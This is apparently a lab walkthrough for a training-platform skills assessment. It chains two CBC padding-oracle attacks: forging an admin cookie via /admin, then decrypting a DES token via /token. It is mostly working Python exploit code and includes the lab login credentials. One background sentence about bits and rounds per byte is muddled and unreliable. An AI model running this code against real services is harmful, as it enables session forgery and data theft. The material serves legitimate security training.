# TLS / HTTPS Attacks — Skills Assessment

This lab requires chaining two separate padding oracle attacks against the same app. The first oracle lets you forge an encrypted cookie to access the admin panel. The second lets you decrypt an encrypted token to get the final result. Different block sizes, different endpoints, same fundamental technique.

---

## Background: CBC Padding Oracle

In AES-CBC decryption:
```
Plaintext_i = AES_Decrypt(Ciphertext_i) XOR Ciphertext_{i-1}
```

If you can submit arbitrary ciphertext and the server tells you whether decryption produced valid PKCS7 padding, you can:
1. Recover the "intermediate" value (AES_Decrypt output) for any block — one byte at a time, 256 guesses max per byte
2. XOR the intermediate with any plaintext you want → forge ciphertext that decrypts to arbitrary plaintext
3. Or XOR the intermediate with the previous ciphertext block → decrypt unknown ciphertext

This is the core loop. Two requests to confirm one bit of information about one byte. 7 bits per byte = 7 rounds, but in practice you try all 256 values and stop at the first valid padding response.

---

## Setup

```bash
# Add to /etc/hosts
echo "TARGET_IP httpattacks.htb" >> /etc/hosts
```

Login with the provided credentials. The app sets a `user` cookie containing the encrypted session. The user cookie is the ciphertext you're working with.

---

## Step 1: Forge Admin Cookie via /admin Oracle

### Oracle Identification

`GET /admin` with an invalid or modified `user` cookie returns `"Decryption failed"`.  
A valid cookie (correct padding) returns anything else (auth check, redirect, etc.).

This is your oracle: **"Decryption failed" = invalid padding**, anything else = valid padding.

Block size: **16 bytes (AES-128)**

### Goal

Encrypt the plaintext `{"user": "admin", "role": "admin"}` into a valid ciphertext that the server will decrypt and accept.

### How CBC Encryption-via-Oracle Works

To encrypt N plaintext blocks, you need N+1 output blocks (IV + N ciphertext blocks). Work backwards:

1. Start with a dummy zero block `C_last = \x00 * 16`
2. For each plaintext block P (right to left):
   - Use the oracle to find `intermediate = AES_Decrypt(C_next)` — 16 bytes, 256 guesses per byte in parallel
   - Compute `C_current = intermediate XOR P`
3. Final ciphertext = all computed blocks + the dummy last block (all blocks, including dummy)

> **Critical:** Include the dummy trailing block in the final ciphertext. It's needed for the server to decrypt the last plaintext block. Forgetting this is a common mistake — the result looks right but has one block of plaintext missing.

### Oracle Function

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET = "http://httpattacks.htb:PORT"
BLOCK_SIZE = 16
MAX_WORKERS = 40

def oracle_admin(ct_hex):
    try:
        r = requests.get(f"{TARGET}/admin", cookies={"user": ct_hex}, timeout=15)
        return "Decryption failed" in r.text   # True = bad padding
    except:
        return True
```

### Finding One Intermediate Byte (Parallelized)

```python
def find_intermediate_byte(byte_pos, intermediate_so_far, target_ct_block, oracle_fn):
    padding_byte = BLOCK_SIZE - byte_pos
    crafted_base = bytearray(BLOCK_SIZE)
    # Set already-known bytes to produce correct padding for known positions
    for k in range(byte_pos + 1, BLOCK_SIZE):
        crafted_base[k] = intermediate_so_far[k] ^ padding_byte

    found = None
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = {
            ex.submit(oracle_fn, (bytes(crafted_base[:byte_pos] + bytes([guess]) +
                                   bytes(crafted_base[byte_pos+1:])) + target_ct_block).hex()): guess
            for guess in range(256)
        }
        for fut in as_completed(futures):
            if not fut.result() and found is None:   # valid padding = found it
                found = futures[fut] ^ padding_byte
    return found
```

### Encrypt Plaintext

```python
import base64

def encrypt_plaintext(plaintext, oracle_fn, block_size=16):
    # PKCS7 pad
    pad_len = block_size - (len(plaintext) % block_size)
    padded = plaintext + bytes([pad_len] * pad_len)
    blocks = [padded[i:i+block_size] for i in range(0, len(padded), block_size)]

    ct_blocks = [b'\x00' * block_size]   # dummy trailing block

    for i in range(len(blocks) - 1, -1, -1):
        next_ct = ct_blocks[0]
        intermediate = bytearray(block_size)

        for byte_pos in range(block_size - 1, -1, -1):
            padding_byte = block_size - byte_pos
            crafted_base = bytearray(block_size)
            for k in range(byte_pos + 1, block_size):
                crafted_base[k] = intermediate[k] ^ padding_byte

            found = None
            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
                futures = {}
                for guess in range(256):
                    crafted = bytearray(crafted_base)
                    crafted[byte_pos] = guess
                    test_hex = (bytes(crafted) + next_ct).hex()
                    futures[ex.submit(oracle_fn, test_hex)] = guess
                for fut in as_completed(futures):
                    g = futures[fut]
                    if not fut.result() and found is None:
                        found = g ^ padding_byte
            intermediate[byte_pos] = found if found is not None else 0

        c_i = bytes(x ^ y for x, y in zip(bytes(intermediate), blocks[i]))
        ct_blocks.insert(0, c_i)

    return b"".join(ct_blocks)   # include dummy — do NOT use ct_blocks[:-1]
```

### Usage

```python
plaintext = b'{"user": "admin", "role": "admin"}'
admin_cookie = encrypt_plaintext(plaintext, oracle_admin)
admin_cookie_hex = admin_cookie.hex()

# Test it
r = requests.get(f"{TARGET}/admin", cookies={"user": admin_cookie_hex})
print(r.status_code, r.text[:200])
```

A 200 response with admin content means the forge worked.

---

## Step 2: Extract Admin Token from /admin

Once you have admin access, the `/admin` page contains an encrypted token. It'll be a long hex string. Pull it out:

```python
import re
token_match = re.search(r'[0-9a-f]{16,}', r.text)
admin_token = token_match.group(0)
print(f"Admin token: {admin_token}")
```

---

## Step 3: Decrypt Admin Token via /token Oracle

### Oracle Identification

`POST /token` with `token=<hex>` parameter and an invalid ciphertext returns `"Decryption Error. Invalid Token!"`.

Block size: **8 bytes (DES/3DES)** — not AES. The token is shorter and uses a smaller block cipher.

### Login for Session

```python
sess = dict(requests.post(f"{TARGET}/login",
    data={"user": "htb-stdnt", "password": "Academy_student!"}).cookies)

def oracle_token(ct_hex):
    try:
        r = requests.post(f"{TARGET}/token", cookies=sess,
                          data={"token": ct_hex}, timeout=15)
        return "Decryption Error. Invalid Token!" in r.text
    except:
        return True
```

Note: the error string is in the HTML of a full page, not a simple JSON response. But `"Decryption Error. Invalid Token!" in r.text` still works because you're checking for substring presence.

### Decrypt Ciphertext

```python
def decrypt_ciphertext(ct_hex, oracle_fn, block_size=8):
    ct = bytes.fromhex(ct_hex)
    blocks = [ct[i:i+block_size] for i in range(0, len(ct), block_size)]
    plaintext = b""

    for i in range(1, len(blocks)):
        intermediate = bytearray(block_size)

        for byte_pos in range(block_size - 1, -1, -1):
            padding_byte = block_size - byte_pos
            crafted_base = bytearray(block_size)
            for k in range(byte_pos + 1, block_size):
                crafted_base[k] = intermediate[k] ^ padding_byte

            found = None
            with ThreadPoolExecutor(max_workers=40) as ex:
                futures = {}
                for guess in range(256):
                    crafted = bytearray(crafted_base)
                    crafted[byte_pos] = guess
                    test_hex = (bytes(crafted) + blocks[i]).hex()
                    futures[ex.submit(oracle_fn, test_hex)] = guess
                for fut in as_completed(futures):
                    g = futures[fut]
                    if not fut.result() and found is None:
                        found = g ^ padding_byte
            if found is not None:
                intermediate[byte_pos] = found

        pt = bytes(x ^ y for x, y in zip(bytes(intermediate), blocks[i-1]))
        plaintext += pt

    # Strip PKCS7 padding
    if plaintext:
        pad = plaintext[-1]
        if 1 <= pad <= block_size:
            plaintext = plaintext[:-pad]

    return plaintext

result = decrypt_ciphertext(admin_token, oracle_token, block_size=8)
print(f"Decrypted: {result.decode(errors='replace')}")
```

---

## Performance Tips

With 40 parallel workers, each byte takes ~256/40 rounds of requests ≈ about 2–3 seconds per byte. For an 8-byte block cipher with 5 ciphertext blocks = 40 bytes = roughly 2–3 minutes total for decryption.

Don't run requests serially — it will take 30+ minutes. Always parallelize the 256 guesses per byte position using `ThreadPoolExecutor`.

Also use `python3 -u` flag (unbuffered) when piping output to `tee`, otherwise you won't see progress in real time:
```bash
python3 -u oracle_attack.py | tee output.log
```

---

## Common Mistakes

**Forgetting the dummy block:** When encrypting, the result must be `b"".join(ct_blocks)` — all blocks including the trailing dummy. If you use `ct_blocks[:-1]`, you lose the last plaintext block from decryption.

**Block size mismatch:** The admin cookie uses AES-128 (block_size=16). The token uses DES/3DES (block_size=8). Using the wrong block size causes every byte lookup to fail.

**Session cookie for /token:** The /token oracle needs a logged-in session. The session cookie from login is separate from the encrypted `user` cookie. Make sure to pass both.
